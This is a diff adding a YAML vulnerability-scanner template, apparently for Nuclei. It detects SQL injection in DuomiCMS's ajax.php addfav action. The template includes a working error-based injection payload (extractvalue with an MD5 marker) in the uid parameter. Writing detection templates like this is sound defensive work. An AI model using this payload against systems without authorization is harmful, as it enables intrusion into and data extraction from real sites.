@@ -1,0 +1,27 @@
+id: duomicms-sql-injection
+info:
+  name: DuomiCMS SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a SQL injection vulnerability in DuomiCMS via the `addfav` action in `ajax.php` by leveraging the `extractvalue` function to include a calculated MD5 hash.
+http:
+  - raw:
+      - |
+        GET /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{r1}}))) HTTP/1.1
+        Host: {{Hostname}}
+    redirects: false
+    extractors:
+      - type: regex
+        name: r2_hash
+        internal: true
+        regex:
+          - "([a-f0-9]{23})"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{r2[:23]}}"
+variables:
+  r1: '{{rand_int(10000000, 50000000)}}'
+  r2: '{{md5(r1)}}'
